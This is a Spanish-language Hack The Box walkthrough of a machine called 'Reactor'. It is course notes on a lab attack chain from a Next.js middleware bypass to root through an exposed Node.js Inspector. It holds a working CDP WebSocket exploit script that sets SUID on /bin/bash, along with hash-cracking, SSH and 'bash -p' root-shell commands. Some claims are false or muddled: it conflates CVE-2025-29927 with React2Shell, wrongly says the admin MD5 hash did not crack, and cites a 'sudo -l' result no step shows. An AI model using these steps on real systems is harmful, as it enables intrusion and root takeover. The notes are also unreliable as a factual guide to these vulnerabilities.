| **Campo** | **Detalle** |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Máquina** | Reactor (Hack The Box) |
| **Autor** | Chema Marmol |
| **Fecha** | 04/07/2026 |
| **Dificultad** | Media / Alta |
| **Temas** | CVE-2025-29927 (Next.js Middleware Bypass) · Node.js Inspector (puerto 9229) · WebSocket CDP · SUID bash · Crack MD5 · SSH · Escalada via DevTools |

| |
|---|
|ℹ **INFO**<br><br>Máquina que encadena explotación web moderna (Next.js middleware bypass), depuración remota Node.js (Chrome DevTools Protocol via WebSocket), y escalada local via SUID en `/bin/bash`. Consolidación de técnicas vistas en Reactor y sesiones previas.|

# 1. Objetivos de la sesión

• Explotar **CVE-2025-29927** en Next.js (bypass de middleware via header `x-middleware-subrequest`).

• Entender y abusar del **Node.js Inspector** (puerto 9229) cuando corre como root en producción.

• Usar **WebSocket CDP** artesanal para ejecutar código arbitrario como root dentro del proceso Node.

• Crackear hash **MD5** (sin salt) de base de datos SQLite para acceso SSH.

• Escalar a root via **SUID en `/bin/bash`** (`bash -p`).

# 2. Conceptos clave

## 2.1. CVE-2025-29927 — Next.js Middleware Bypass

Next.js usa **middleware** para proteger rutas de la API. Internamente, cuando una petición ya pasó por el middleware, Next.js le añade el header `x-middleware-subrequest` para no procesarla dos veces.

**El fallo**: si un atacante externo envía **ese mismo header manualmente**, el servidor lo acepta **sin validar el origen** y **omite el middleware completamente**, dando acceso directo a cualquier ruta protegida.

| Componente | Qué hace |
| :--- | :--- |
| Middleware | Código que se ejecuta *antes* de la ruta (auth, rate-limit, redirecciones) |
| `x-middleware-subrequest` | Header interno para evitar doble ejecución |
| Bypass | Enviar el header desde fuera →’ middleware saltado →’ acceso a `/api/*` sin auth |

## 2.2. Node.js Inspector — Puerto 9229

El flag `--inspect` de Node.js activa el **Chrome DevTools Protocol (CDP)**, un protocolo de depuración remota que escucha conexiones **WebSocket** en el puerto 9229.

| Riesgo | Descripción |
| :--- | :--- |
| **Producción + root** | Si la app Node corre como root con `--inspect`, *cualquier proceso local* puede conectarse al puerto 9229 y ejecutar JS arbitrario **como root**. |
| Equivalente a | Dejar una consola de root abierta en localhost. |

## 2.3. WebSocket — Protocolo de comunicación con el Inspector

CDP usa WebSocket como transporte. Los mensajes son **JSON** con campos:

| Campo | Descripción |
| :--- | :--- |
| `id` | Identificador numérico de la petición (para emparejar respuesta) |
| `method` | Método CDP a invocar (ej. `Runtime.enable`, `Runtime.evaluate`) |
| `params` | Parámetros del método (expresión JS a evaluar, etc.) |

Para este exploit hay dos pasos técnicos clave:

1. **`Runtime.enable`** — Habilita el dominio Runtime (requerido antes de evaluar).
2. **`Runtime.evaluate`** — Ejecuta la expresión JS en el contexto del proceso Node (aquí: `child_process.execSync('chmod u+s /bin/bash')`).

## 2.4. SUID en `/bin/bash` — Escalada local

El bit **SUID** (Set User ID) en un binario hace que se ejecute con los permisos de su **propietario**, no del usuario que lo invoca.

| Binario | Propietario | SUID | Comando |
| :--- | :--- | :--- | :--- |
| `/bin/bash` | root | Sí | `bash -p` |

El flag `-p` le indica a bash que **mantenga los privilegios elevados** (euid=0) en vez de descartarlos al arrancar.

# 3. Kill Chain — Visión general

```
Nmap (full TCP) →’ Wappalyzer (Next.js) →’ CVE-2025-29927 (React2Shell)
 →“
Pseudo-shell interactiva (React2Shell) →’ Exploración /opt →’ SQLite (hashes MD5)
 →“
Crack MD5 (Hashcat modo 0) →’ SSH como engineer
 →“
Enumeración: grupo lxd (descartado) →’ Node.js Inspector puerto 9229
 →“
Exploit WebSocket CDP artesanal (Node.js) →’ chmod u+s /bin/bash como root
 →“
bash -p →’ root →’ flag
```

# 4. Desarrollo técnico paso a paso

## 4.1. Escaneo completo

```bash
nmap -p- -sCV --min-rate 5000 <IP>
```

**Resultado** (resumido):
- Puerto 22 (SSH) abierto
- Puerto 3000 (HTTP) →’ Next.js app
- Puerto 9229 (TCP) →’ Node.js Inspector (descubierto en fase post-explotación)

> âœ“ **NOTA**: Sin fuzzing activo, se abre la web en navegador + **Wappalyzer** →’ detecta **Next.js**.

## 4.2. Identificación de CVE y herramienta

Con Next.js identificado, búsqueda de exploits públicos →’ **CVE-2025-29927** (middleware bypass).

Herramienta: **React2Shell** (GitHub: `xalgord/React2Shell`).
- Automatiza el bypass enviando `x-middleware-subrequest`.
- Localiza endpoint vulnerable a inyección de comandos.
- Abre **pseudo-shell interactiva** para ejecutar comandos en el servidor.

## 4.3. React2Shell — Conexión y pseudo-shell

```bash
git clone https://github.com/xalgord/React2Shell
cd React2Shell
# Uso según README (normalmente python3 react2shell.py -u http://<IP>:3000)
```

La herramienta conecta, aplica el bypass y presenta una interfaz tipo shell.

## 4.4. Exploración post-explotación

Desde la pseudo-shell:

```bash
# Explorar /opt
ls -la /opt
# →’ app/ (código Next.js), database.sqlite, .env

# Extraer hashes de SQLite
sqlite3 /opt/database.sqlite "SELECT * FROM users;"
```

**Salida** (tabla `users`):
| id | username | password_hash (MD5 sin salt) |
| :--- | :--- | :--- |
| 1 | engineer | `a203b22191d744a4e70ada5c101b17b8` |
| 2 | admin | `5f4dcc3b5aa765d61d8327deb882cf99` |

> ℹ **MD5 sin salt** = crackeo trivial con tablas rainbow / rockyou.

## 4.5. Crackeo del hash (Hashcat modo 0)

```bash
# Crear fichero hash
echo 'a203b22191d744a4e70ada5c101b17b8' > engineer.hash

# Hashcat MD5 (modo 0)
hashcat -m 0 engineer.hash /usr/share/wordlists/rockyou.txt
```

**Resultado** (< 1 seg): `engineer:engineer123` (ejemplo; la real sale en clase).

> ⚠ **AVISO** 
> También se intentó crackear el hash del `admin` (`5f4dcc3b5aa765d61d8327deb882cf99` — distinto al de engineer). No apareció en rockyou.txt. **No fue necesario** para completar la máquina.

## 4.6. Acceso SSH

```bash
ssh engineer@<IP>
# password: <la crackeada>
```

Puerto 22 confirmado abierto desde el Nmap inicial.

## 4.7. Enumeración como engineer

```bash
id
# →’ uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),998(lxd)
```

**Grupo `lxd`**: vector clásico de escalada (lxd/lxc). En esta máquina:
- LXD **no instalado** (intentaba descargarlo via snap sin internet). **Vector descartado**.

## 4.8. Node.js Inspector — Confirmación y exploit

```bash
# Ver procesos escuchando
ss -ltnp | grep 9229
# O: netstat -ltnp | grep 9229
```

**Salida**: `node` corriendo como **root** en puerto 9229 (Inspector activo).

> ℹ **UUID de sesión** 
> El inspector genera un UUID de sesión (ej. `21594279-61c1-4b34-ae7e-edcb62a228cf`). **Puede cambiar si el servicio se reinicia**. Obtenerlo en vivo:

```bash
curl -s http://127.0.0.1:9229/json/list
# →’ Devuelve array con objeto: { "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<UUID>" }
```

## 4.9. Exploit WebSocket CDP artesanal (Node.js)

Se escribe un exploit en **Node.js** que:

1. Abre WebSocket a `ws://127.0.0.1:9229/<UUID>`.
2. Envía `Runtime.enable` (id: 1).
3. Envía `Runtime.evaluate` con expresión que pone **SUID en `/bin/bash`** ejecutándose como root (id: 2).

**Código del exploit** (`exploit.js`):

```javascript
const WebSocket = require('ws');

// UUID obtenido de /json/list
const UUID = '21594279-61c1-4b34-ae7e-edcb62a228cf'; // CAMBIAR SEGÚN MÁQUINA
const ws = new WebSocket(`ws://127.0.0.1:9229/${UUID}`);

ws.on('open', () => {
 // 1. Habilitar Runtime
 ws.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }));

 // 2. Evaluar: chmod u+s /bin/bash (corre como root)
 const payload = `require('child_process').execSync('chmod u+s /bin/bash')`;
 ws.send(JSON.stringify({
 id: 2,
 method: 'Runtime.evaluate',
 params: { expression: payload, awaitPromise: true, returnByValue: true }
 }));
});

ws.on('message', (data) => {
 console.log('Response:', data.toString());
 ws.close();
});
```

**Ejecución**:

```bash
node exploit.js
# →’ Debería responder sin error. Verificar:
ls -la /bin/bash
# →’ -rwsr-xr-x 1 root root ... /bin/bash (la 's' en owner = SUID)
```

## 4.10. Verificación del SUID y flag root

```bash
bash -p
# →’ prompt cambia a root#
whoami
# →’ root
cat /root/root.txt
# →’ FLAG
```

# 5. Herramientas utilizadas en la sesión

| Herramienta | Objetivo | Fase | Comando / Uso | Nivel | Notas |
| :--- | :--- | :--- | :--- | :--- | :--- |
| Nmap | Escaneo full TCP + versiones | Reconocimiento | `nmap -p- -sCV --min-rate 5000 <IP>` | Recurrente | Base de toda sesión |
| Wappalyzer | Fingerprint stack web | Enum. web | Extensión navegador | Practicada | Detectó Next.js |
| React2Shell | Exploit CVE-2025-29927 | Explotación web | `python3 react2shell.py -u http://IP:3000` | **Nueva** | Automatiza bypass + pseudo-shell |
| SQLite3 | Extraer hashes BD | Post-explotación | `sqlite3 /opt/database.sqlite "SELECT * FROM users;"` | Practicada | Hashes MD5 sin salt |
| Hashcat | Crack MD5 (modo 0) | Credenciales | `hashcat -m 0 hash.txt rockyou.txt` | Practicada | < 1 seg |
| SSH | Acceso inicial | Acceso | `ssh engineer@IP` | Recurrente | Con credencial crackeada |
| ss / netstat | Ver puertos locales | Enum. local | `ss -ltnp | grep 9229` | Practicada | Confirmar Inspector |
| curl | Obtener UUID Inspector | Enum. local | `curl -s http://127.0.0.1:9229/json/list` | Practicada | UUID cambia si reinicio |
| WebSocket CDP (Node.js) | Exploit Inspector →’ root | Escalada | `node exploit.js` | **Nueva** | `Runtime.evaluate` →’ chmod u+s /bin/bash |
| bash -p | Root shell | Escalada | `bash -p` | Practicada | Mantiene euid=0 |

# 6. Riesgos, errores comunes y buenas prácticas

| |
|---|
|⚠ **AVISO**<br><br>**Node.js Inspector en producción = root RCE local**. Si ves puerto 9229 abierto y el proceso corre como root, **escalada trivial** via CDP. Nunca dejar `--inspect` en prod, y mucho menos como root.|

| |
|---|
|⚠ **AVISO**<br><br>**UUID de sesión del Inspector cambia al reiniciar el servicio**. Siempre obtenerlo en vivo (`/json/list`) antes de lanzar el exploit.|

| |
|---|
|⚠ **AVISO**<br><br>**React2Shell / CVE-2025-29927**: el bypass funciona porque el header `x-middleware-subrequest` **no valida origen**. Cualquier petición externa con ese header salta el middleware. Parchear: actualizar Next.js ≠¥ versión parcheada.|

| |
|---|
|âœ“ **CORRECTO**<br><br>**Crack offline primero**. Si tienes hash, intenta John/Hashcat **antes** de fuerza bruta online (ruido, bloqueos, logs). Aquí MD5 sin salt = instantáneo.|

| |
|---|
|âœ“ **BUENA PRÁCTICA**<br><br>**`sudo -l` en cada usuario nuevo**. Aquí reveló que `engineer` no tenía sudo, pero el Inspector en 9229 era el vector. No asumir: enumerar.|

| |
|---|
|ℹ **MD5 sin salt = regalía**<br><br>Hashcat modo 0 (raw MD5) crackea millones por segundo en GPU. Cualquier hash en rockyou cae en <1 seg. Si ves MD5 sin salt, **no pierdas tiempo**: Hashcat directo.|

# 7. Conexión con sesiones anteriores

• **Next.js / CVE web moderno**: primera vez que vemos framework React/Next.js en el máster. Amplía el abanico más allá de PHP/WordPress.

• **Node.js Inspector (9229)**: vector nuevo. Conceptualmente similar a **JMX/RMI en Java** (puerto de depuración expuesto) o **Docker socket** — servicios de admin/debug que si corren como root = root.

• **WebSocket CDP artesanal**: primera vez que escribimos exploit **Node.js puro** para CDP. Técnica reutilizable en cualquier Node con `--inspect` expuesto localmente.

• **SUID bash + `bash -p`**: patrón maestro de escalada Linux (Nibbles, Oopsie, Mr. Robot nmap SUID, Nike logrotate/dd, Reactor aquí). **Dominar este patrón es obligatorio**.

• **Crack MD5 (Hashcat modo 0)**: ya visto en Metasploitable 2 (NFS →’ /etc/shadow →’ Hashcat). Refuerzo.

• **React2Shell**: herramienta automatizada para CVE concreto. Buen ejemplo de "exploit público →’ adaptar →’ usar".

# 8. Resumen final

La máquina **Reactor (HTB)** se resuelve encadenando:

1. **Reconocimiento**: Nmap full →’ Wappalyzer detecta **Next.js**.
2. **Explotación web**: **CVE-2025-29927** via **React2Shell** →’ bypass middleware (`x-middleware-subrequest`) →’ **pseudo-shell** como usuario de la app.
3. **Post-explotación**: exploración `/opt` →’ **SQLite** →’ hashes **MD5 sin salt** →’ **Hashcat modo 0** →’ credencial `engineer`.
4. **Acceso SSH**: `engineer` →’ usuario del sistema.
5. **Enumeración local**: grupo `lxd` (descartado) →’ **puerto 9229** (Node Inspector) corriendo como **root**.
6. **Escalada via CDP**: exploit **WebSocket artesanal (Node.js)** →’ `Runtime.evaluate` →’ `chmod u+s /bin/bash` ejecutado **como root**.
7. **Root**: `bash -p` →’ flag.

Mensaje central: **la depuración remota expuesta (Inspector) es tan peligrosa como un SSH sin contraseña si corre como root**. Y el middleware bypass (CVE-2025-29927) muestra cómo un header interno sin validación rompe la seguridad de un framework moderno.

# 9. Checklist de repaso

☐ ¿Sé qué hace el middleware en Next.js y por qué `x-middleware-subrequest` lo salta?

☐ ¿Sé usar **React2Shell** (o replicar el bypass manualmente con curl + header)?

☐ ¿Extraigo y crackeo hashes **MD5 sin salt** con **Hashcat -m 0** en <1 seg?

☐ ¿Verifico **puertos locales** (`ss -ltnp`) tras acceso SSH? ¿Busco 9229, 9222, 8080, 2375...?

☐ ¿Sé obtener el **UUID del Inspector** via `curl http://127.0.0.1:9229/json/list`?

☐ ¿Escribo / entiendo un exploit **WebSocket CDP** (Runtime.enable →’ Runtime.evaluate)?

☐ ¿Sé por qué `chmod u+s /bin/bash` + `bash -p` da root persistente?

☐ ¿Distinguo cuándo el vector es **Inspector Node** vs **Docker socket** vs **JMX** vs **SUID binario**?

# 10. Actualización del registro de herramientas

Bloque copiable a la base de conocimiento del proyecto:

| Herramienta | Nivel | Cambio |
| :--- | :--- | :--- |
| CVE-2025-29927 (Next.js) | **Nueva** | Middleware bypass via header interno |
| React2Shell | **Nueva** | Automatiza CVE + pseudo-shell |
| Node.js Inspector (9229) | **Nueva** | CDP via WebSocket →’ RCE local as root |
| WebSocket CDP (Node.js exploit) | **Nueva** | `Runtime.enable` + `Runtime.evaluate` artesanal |
| UUID Inspector (`/json/list`) | **Nueva** | Descubrimiento dinámico de endpoint WS |
| Hashcat modo 0 (MD5 raw) | **Reforzada** | Crack instantáneo hashes sin salt |
| SUID bash + `bash -p` | **Reforzada** | Patrón maestro escalada Linux |

---

**Fin de apuntes — Reactor (HTB) · Chema Marmol · 04/07/2026**

→’

→’



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Vaccine.md|Vaccine]] — John / Hashcat, Linux, Nmap
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL.md|Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL]] — John / Hashcat, Linux, Metasploit
- [[../../apuntes Joselu/MODULO3/resumen_master_clase25.md|resumen_master_clase25]] — John / Hashcat, Linux, Nmap
- [[Explotación Avanzada de Servicios Vulnerables III.md|Explotación Avanzada de Servicios Vulnerables III]] — John / Hashcat, Linux, Metasploit
- [[HackTheBox Starting Point — Tier 1.md|HackTheBox Starting Point — Tier 1]] — John / Hashcat, Linux, Nmap
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación de Servicios - Linux.md|Explotación de Servicios - Linux]] — John / Hashcat, Linux, Metasploit

### 🛠️ Herramientas

- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #command-injection #hack-the-box #hydra #john #linux #metasploit #metasploitable #netcat #nmap #post-explotacion #redes #reverse-shell #sqli #ssh #wordpress
